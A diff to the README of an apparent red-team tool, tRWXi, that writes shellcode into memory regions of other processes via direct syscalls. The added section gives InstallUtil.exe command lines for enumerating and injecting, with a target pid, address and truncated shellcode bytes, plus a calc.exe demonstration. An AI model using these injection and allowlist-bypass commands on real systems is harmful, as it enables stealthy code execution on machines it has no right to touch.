@@ -63,3 +63,19 @@ Implementated using Nt direct syscalls for less visibility.
 Usage:
         .\tRWXiu.exe /pid=<pid> /address=<address> /data=<data> [/verbose]
 ```
+
+# tRWXi-InstallUtil
+
+### Usage:
+- enumeration
+```
+C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /enumerate .\tRWXi-InstallUtil.exe
+```
+- inject
+```
+C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /inject /pid=10348 /address=0x18306C70000 /data="0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8..." .\tRWXi-InstallUtil.exe
+```
+
+### Example:
+- Inject and trigger the execution of calc.exe
+![RWX injection](./_readme.d/03-install-util-1.png)
